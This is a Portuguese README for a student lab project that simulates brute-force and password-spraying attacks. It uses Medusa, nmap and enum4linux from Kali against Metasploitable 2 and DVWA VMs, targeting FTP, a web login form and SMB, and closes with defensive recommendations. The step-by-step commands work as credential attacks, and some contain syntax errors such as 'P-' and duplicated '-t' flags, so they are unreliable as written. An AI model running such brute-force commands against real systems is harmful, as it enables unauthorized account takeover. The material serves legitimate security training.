# 🛡️ Projeto de Cibersegurança — Ataque de Força Bruta (Laboratório)

---

## 📋 Descrição
Projeto de laboratório para **simular ataques de força bruta** e password spraying em ambiente controlado, utilizando **Kali Linux** e ferramentas como **Medusa**, **Hydra** e **CrackMapExec**, com alvos em **FTP**, **formulário web (DVWA)** e **SMB** (com enumeração de usuários). O repositório contém documentação passo a passo, comandos executados, wordlists de exemplo e templates de registro de testes.

---

## 🧰 Ferramentas e Tecnologias
- Sistema atacante: **Kali Linux**
- Alvos vulneráveis: **Metasploitable 2**, **DVWA** (instâncias em VMs)
- Ferramentas de ataque/enumeração: **Medusa**, **Nmap**, **enum4linux**, **CrackMapExec (CME)**
- Virtualização: **VirtualBox** (modo Host-Only / Internal Network)
- Auxiliares: `ftp`, `smbclient`, `smbmap`

---

## ⚙️ Configuração do Ambiente (resumo)
1. Configuração das VMs (Kali + Metasploitable2/DVWA).
2. Definfição da rede isolada: **Host-Only** ou **Internal Network** para comunicação apenas entre VMs.
3. Snapshot das VMs antes de iniciar os testes (para restaurar o estado em algum caso de erro).
4. Usar comandos com NMAP para identificar o nosso alvo nos hosts ativos
5. Fazer enumeração e descobrir quais serviços estão disponiveis no sistema alvo

---

## 🚀 Execução do Projeto — passo a passo

### 1) Ataque de força bruta em FTP (laboratório)
**Objetivo:** testar a resistência de contas FTP a tentativas massivas de credenciais.

**Passo a passo:**
1. **Descobrir o serviço FTP**
   ```bash
   nmap -p 21 -sV 192.168.56.101
   ```

2. **Testar conectividade manualmente**
   ```bash
   ftp 192.168.56.101
   ```

3. **Preparar wordlists**
   - `users.txt` (usuários) e `passwords.txt` (senhas). em `wordlists/`.

4. **Executar ataque com Medusa**

   ```bash
   medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -T 4 
   ```

---

### 2) Automação de tentativas em formulário web (DVWA)
**Objetivo:** simular força bruta em formulário de login web e demonstrar contramedidas.

**Passo a passo:**
1. **Acessar formulário web alvo**
   ```bash
   192.168.56.101/dvwa/login.php
   ```
2. **Preparar wordlists**
   - `users.txt` e `passwords.txt` em `wordlists/`.

4. **usar o medusa com as wordlists**
   o medusa vai substituir o user e o password por cada linha das wordlists users.txt e passwords.txt
   
   medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M http \
  -m PAGE:/dvwa/login.php \
  -m FORM:username=^USER&password=^PASS&Login=Login 
  -m FAIL:"Login failed" -t 6
  
---

### 3) Password spraying em SMB com enumeração de usuários
**Objetivo:** testar password spraying (poucas senhas contra muitos usuários).

**Passo a passo:**
1. **Enumeração de usuários**
   - Ferramentas: `enum4linux`, `smbclient`.
   ```bash
   enum4linux -a 192.168.56.101 | tee enum4linux_output.txt
   ```
   - Verificar a Extração da lista a partir da enumeração.

2. **Preparar wordlists de users e passwords para spraying**
   -`smb_users.txt` 
   -`smb_passwords.txt` — poucas senhas comuns

3. **Executando password spraying com medusa**

   ```bash
   medusa -h 192.168.56.101 -U smb_users.txt P- smb_passwords.txt -M smbnt -t 2 -t 50
   ```
    após realizar os testes ira retornar o usuario e a senha para logar no sistema
4. **verificar o acesso**
     ```bash
     smbclient -L //192.168.56.101 -U mfsadmin
     ```
   

---

## 🧠 Conclusões e Recomendações 
- **Senhas fracas** facilitam comprometimento por força bruta; políticas de senhas e MFA reduzem risco.
- **Rate limiting** e **CAPTCHA** mitigam automação em formulários web.
- **Monitoramento/SIEM** é importante para detectar padrões de password spraying.
- Testes devem ser realizados em ambiente controlado com autorização por escrito.

---

## 👨‍💻 Autor
**Jonathan Belarmino** — Estudante / pesquisador.

Data: 2025-10-27

---
